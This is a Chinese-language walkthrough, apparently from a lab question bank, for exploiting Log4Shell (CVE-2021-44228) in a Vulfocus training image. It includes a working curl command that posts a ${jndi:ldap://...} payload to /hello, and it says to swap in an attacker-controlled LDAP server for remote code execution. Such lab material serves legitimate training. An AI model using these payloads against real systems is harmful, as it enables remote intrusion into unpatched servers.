# 134｜Log4j2 JNDI lookup RCE（题库无 CVE；校正为 CVE-2021-44228）

- 镜像：`vulfocus/log4j2-rce-2021-12-09`
- 题库端口：`8080`
- 题库 CSV **未填 CVE**。镜像名日期 2021-12-09 即 Log4Shell 公开日；Vulfocus 复现与 Apache 公告均按 **CVE-2021-44228**（Log4j 2 lookup JNDI）处理，不是第133题的 4104。[S1][S2][S3]

## 一句话打法

对本镜像的 `POST /hello` 表单字段 `payload` 提交 `${jndi:ldap://...}`，让 Log4j2 在记日志时做 JNDI lookup。[S1][S2]

## 操作步骤

1. 确认入口。公开 Vulfocus 复现把该镜像跑在容器 `8080`，HTTP 接口是 `/hello`，参数名 `payload`。先用 DNS 外带验证 lookup 是否发生（无回显）：[S1]

   ```powershell
   curl.exe -i --globoff -X POST "http://<靶场IP>:8080/hello" --data-raw 'payload=${jndi:ldap://<你的dnslog>/a}'
   ```

   PowerShell 下含 `${}` 的载荷必须用**单引号**包 `--data-raw`，否则本机会先展开；`--globoff` 避免花括号被 glob。[S1]

2. DNS 平台出现解析记录即说明 JNDI 已触发。这是本镜像最短可执行链。[S1]

3. 要命令执行时，把 ldap 主机换成自己控制的 JNDI/LDAP 服务。公开复现写明：JDK 升到 `11.0.1` / `8u191` / `7u201` / `6u211` 或更高后，默认不拉远程 codebase。本镜像 JDK **未在题库证实**，以步骤 1 的 DNS 是否出现为准，不要默认能 RCE。[S1][S2]

## 本题特有排坑

- **不是 CVE-2021-4104。** 4104 是 Log4j 1.2 写配置 + JMSAppender；本题是 Log4j 2 对**日志内容**做 `${jndi:...}` lookup。两题镜像名都带 log4j2，不要混打。[S2][S3]
- 入口是 **POST `/hello` + `payload=`**，不是 Vulhub Solr 的 `/solr/admin/cores?action=`。Solr 那条只属于 Vulhub CVE-2021-44228 环境。[S1][S4]
- 官方受影响为 `log4j-core` 2.0-beta9 至 2.15.0 之前（另有 2.3.x / 2.12.x 分支修复）；只有 `log4j-api` 不够。2.15.0 是对 44228 的首个修复，后续还有 45046 等，不要把“已是 2.15”当成一定不可打 DNS。[S3]
- 无 HTTP 回显；不要用 200/正文当失败条件。[S1]
